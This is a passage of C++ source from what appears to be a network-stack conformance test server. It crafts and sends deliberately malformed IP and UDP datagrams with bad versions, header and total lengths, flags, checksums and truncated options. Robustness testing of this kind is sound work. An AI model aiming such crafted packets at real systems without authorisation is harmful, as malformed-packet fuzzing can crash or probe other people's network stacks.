			pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);

			// Hard to explain this one...  Basically, for tests where we are overriding the total length
			// field of the IP datagram, and that overridden value is less than the actual amount of data in
			// the packet (including its payload)...  Then we also want to override the length field in the
			// UDP header so that the generated UDP packet is still valid
			if(!fCalcTotalLen && (TotalLength >= UDPHEADER_SIZE + IPHEADER_SIZE) && (TotalLength < PayloadSize + IPHEADER_SIZE))
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(TotalLength - IPHEADER_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(ON);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(ON);
			}
			
			// If we are to send data beyond the header, set up the data buffer
			if(PayloadSize > UDPHEADER_SIZE)
			{
				// Create the buffer for the remaining packet data
				pBuffer = (CHAR *) LocalAlloc(LPTR, PayloadSize - UDPHEADER_SIZE);
				memset(pBuffer, (int) 'x', PayloadSize - UDPHEADER_SIZE);
				
				// Associate that buffer with the packet
				pUDPPacket->SetUserBuffer(pBuffer, PayloadSize - UDPHEADER_SIZE, TRUE);				
			}
		}
		else if(PayloadSize > 0)
		{
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, PayloadSize);
			memset(pBuffer, (int) 'x', PayloadSize);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, PayloadSize, TRUE);								
		}
		
		pSessionInfo->pInterface->Send(*pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	if(pIPPacket)
		((Protocol == PROTOCOL_UDP) && (PayloadSize >= UDPHEADER_SIZE)) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;

	pBuffer ? LocalFree(pBuffer) : 0;

	return fSuccess;
}

//==================================================================================
// IPVersionSixServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating version 6
//
// Arguments:
//	DWORD		FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionSixServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_SIX, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPVersionBadServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating an unknown version (16)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionBadServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_BAD, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPHeaderLenBelowMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length below the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		IPHEADER_BELOWMIN, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		FALSE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPHeaderLenMaxServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a maximum header length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		IPHEADER_MAX, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		FALSE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPHeaderLenAboveTotalLenServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length larger than the total length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveTotalLenServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		IPHEADER_MAX, 
		IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		FALSE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPHeaderLenAboveAvailServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length larger than the bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		IPHEADER_MAX, 
		IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		FALSE,
		FALSE,
		FALSE);
}

//==================================================================================
// IPTosNormalServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a normal type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNormalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_NORMAL, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTosNetControlServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a net-control type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNetControlServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_NETCONTROL, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTosLowDelayServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a low-delay type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosLowDelayServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_LOWDELAY, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTosHighThroughputServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a high-throughput type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighThroughputServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_HIGHTHRUPUT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTosHighReliabilityServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a high-reliability type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighReliabilityServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_HIGHRELI, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTosReservedServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a reserved type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosReservedServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_RESERVED, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1, 
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPLengthBelowMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a total length below the minimum possible
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		IPLENGTH_BELOWMIN, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		0, 
		0, 
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPLengthAtMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a minimum valid total length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAtMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		IPLENGTH_ATMIN, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		0, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPLengthAboveMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length above the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPLengthAboveTotalServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length greater than the number of bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 2, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPLengthBelowTotalServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length less than the number of bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 2,
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPLengthMaxServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the maximum single datagram size
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		IPLENGTH_MAX, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		IPLENGTH_MAX - IPHEADER_SIZE,
		TRUE, 
		TRUE,
		TRUE,
		FALSE);
}

//==================================================================================
// IPIDMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the minimum datagram ID
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_MIN, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPIDMaxServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the maximum datagram ID
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_MAX, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPFlagReservedSetServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the reserved bit of the flags field set
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagReservedSetServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		IPFLAG_RESERVED, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPFlagDontFragAndMoreFragsServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram both  don't-frag and more-frags flag set
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagDontFragAndMoreFragsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		IPFLAG_DONTFRAG | IPFLAG_MOREFRAGS, 
		0, 
		IPTTL_DEFAULT, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTtlMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with minimum time-to-live
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_MIN, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPTtlMaxServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with maximum time-to-live
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_MAX, 
		PROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolUnsupportedServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram of an unsupported protocol
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_UNSUPPORTED, 
		1,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolICMPTooSmallServ
//----------------------------------------------------------------------------------
//
// Description: Server sends ICMP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolICMPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_ICMP, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolIGMPTooSmallServ
//----------------------------------------------------------------------------------
//
// Description: Server sends IGMP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolIGMPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_IGMP, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolTCPTooSmallServ
//----------------------------------------------------------------------------------
//
// Description: Server sends TCP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolTCPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_TCP, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolUDPTooSmallServ
//----------------------------------------------------------------------------------
//
// Description: Server sends UDP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUDPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_UDP, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPProtocolUnsupportedTooSmallServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram of unsupported protocol with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_UNSUPPORTED, 
		0,
		TRUE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPChecksumBadServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a bad checksum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPChecksumBadServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendIPPacket(pSessionInfo,
		FromAddr, 
		IPVERSION_DEFAULT, 
		0, 
		IPTOS_DEFAULT, 
		0, 
		IPID_DEFAULT, 
		0, 
		0, 
		IPTTL_DEFAULT, 
		IPPROTOCOL_UDP, 
		UDPHEADER_SIZE + 1,
		FALSE, 
		TRUE,
		TRUE,
		TRUE);
}

//==================================================================================
// IPOptionsAboveAvailServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with an option that is cutoff by the end of the datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	CIPOption *pIPOption = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Hard-code the address for now.  We'll work something better out later.
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pIPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pIPPacket->IPHeader.SetID(IPID_DEFAULT);
		pIPPacket->IPHeader.SetFlag(0);
		pIPPacket->IPHeader.SetFragOffset(0);
		pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pIPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pIPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 4);

		pIPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pIPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 4);

		pIPOption = pIPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(sizeof(DWORD));
		pIPOption->SetOptionLength(11);
		pIPOption->SetOptionOffset(8);

		pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pSessionInfo->pInterface->Send(*pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

